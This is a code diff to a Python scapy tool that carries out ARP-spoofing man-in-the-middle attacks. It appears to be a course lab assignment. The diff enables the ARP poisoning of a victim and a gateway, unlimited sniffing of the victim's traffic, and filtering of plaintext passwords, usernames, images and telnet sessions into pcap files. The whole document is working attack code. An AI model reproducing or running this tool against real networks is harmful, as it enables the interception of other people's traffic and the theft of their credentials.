@@ -15,7 +15,7 @@ def iteratePcap(pcap_path):
 def writePcap(pcap_name, pkt_list):
     path_root = "data/captures/filtered"
     save_path = os.path.join(path_root, pcap_name)
-    wrpcap(save_path, pkt_list, append=False)
+    wrpcap(save_path, pkt_list, append=True)
 
 
 def get_mac(ip):
@@ -43,19 +43,24 @@ class Arper:
         self.victim_mac = get_mac(self.victim_ip)
         self.gateway_mac = get_mac(self.gateway_ip)
 
-        self.poisoner = Process(target=self.poison)
-        self.sniffer = Process(target=self.sniff, args=(100,))
+        self.poisoner = Process(target=self.poison, daemon=True)
+        self.sniffer = Process(target=self.sniff, args=(-1,), daemon=True)
+
+        self.tot_written = 0
+        self.first100 = []
+        self.gotfirst100 = False
 
     def run(self):
         """
         create concurrent processes to sniff and poison
         """
         # self.sniff()
-        # self.poisoner.start()
+
+        self.poisoner.start()
         self.sniffer.start()
 
-        # self.poisoner.join()
-        # self.sniffer.join()
+        self.poisoner.join()
+        self.sniffer.join()
 
     def poison(self):
         victim_poison = scapy.ARP(op=2, psrc=self.gateway_ip, pdst=self.victim_ip, hwdst=self.victim_mac)
@@ -66,30 +71,52 @@ class Arper:
             try:
                 scapy.send(victim_poison)
                 scapy.send(gateway_poison)
-            except:
+            except KeyboardInterrupt:
                 self.end()
                 run = False
 
             time.sleep(10)
+        sys.exit(1)
 
-    def packet_sniff(self, filter):
+    def packet_sniff(self, filter, count=1):
         while True:
-            packet = scapy.sniff(count=1, filter=filter)
-            print(packet.summary())
+            packet = scapy.sniff(count=count, filter=filter)
+            # print(packet.summary())
             yield packet
+
+    def filterWrite(self, captured_packets, pkt_count):
+        first_100, plaintest_passwd_user, img_responses, modified_telnet = filter(
+            capture_itr=captured_packets).processPackets(captured_packets)
+
+        all = [first_100, plaintest_passwd_user, img_responses, modified_telnet]
+        all_names = ["Task 2 - Step 1.pcap", "Task 2 - Step 2.pcap", "Task 2 - Step 3.pcap", "Task 2 - Step 4.pcap", ]
+
+        if self.tot_written >= 100 and self.gotfirst100 == False:
+            writePcap(all_names[0], self.first100[:99])
+            self.gotfirst100 = True
+        else:
+            self.first100.append(captured_packets)
+            self.tot_written += len(captured_packets)
+
+        for i in range(1, len(all)):
+            if len(all[i]) != 0:
+                writePcap(all_names[i], all[i])
+
+        writePcap("all.pcap", captured_packets)
 
     def sniff(self, count=100):
         # this function performs the sniffing attack
         victim_ip_filter = f"ip host {self.victim_ip}"
-        packet_gen = self.packet_sniff(victim_ip_filter)
+        packet_gen = self.packet_sniff(victim_ip_filter, count=1)
 
-        caputure = []
         i = 0
         # for i in range(count):
-        while True:
-            caputure.append(next(packet_gen))
-            print(f"captured {self.victim_ip} {i + 1}/{count}")
-            i += 1
+        while i != count:
+            pkt_batch = next(packet_gen)
+            i += len(pkt_batch)
+            self.filterWrite(pkt_batch, i)
+
+            print(f"captured {self.victim_ip} {i}/{count}")
 
     def restore(self):
         victim_cure = scapy.ARP(op=2,
@@ -116,11 +143,10 @@ class filter:
         self.capture_itr = capture_itr
         # self.packets = [pkt for pkt in capture_itr]
 
-    def processPackets(self):
+    def processPackets(self, pkt_itr):
         first_100 = []
         plaintest_passwd_user = []
         img_responses = []
-
         telnet_pkts = []
         modified_telnet = []
 
@@ -298,7 +324,7 @@ class filter:
 
 def arpSpoof():
     # (victim, destination, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
-    (victim, destination, interface) = ("192.168.2.209", "192.168.2.1", "wlp59s0")
+    (victim, destination, interface) = ("192.168.2.120", "192.168.2.1", "wlp59s0")
     myarp = Arper(victim, destination, interface)
     myarp.run()
 
@@ -314,7 +340,7 @@ def questions():
     # pkt_iterator = iteratePcap("data/captures/example/http_witp_jpegs.cap")
     pkt_iterator = iteratePcap("data/captures/example/telnet.cap")
     filterer = filter(capture_itr=pkt_iterator)
-    first_100, plaintest_passwd_user, img_responses, modified_telnet = filterer.processPackets()
+    first_100, plaintest_passwd_user, img_responses, modified_telnet = filterer.processPackets(pkt_iterator)
     all = [first_100, plaintest_passwd_user, img_responses, modified_telnet]
     all_names = ["Task 2 - Step 1.pcap", "Task 2 - Step 2.pcap", "Task 2 - Step 3.pcap", "Task 2 - Step 4.pcap", ]
     for i in range(len(all)):
@@ -322,5 +348,5 @@ def questions():
 
 
 if __name__ == '__main__':
-    # arpSpoof()
-    questions()
+    arpSpoof()
+    # questions()
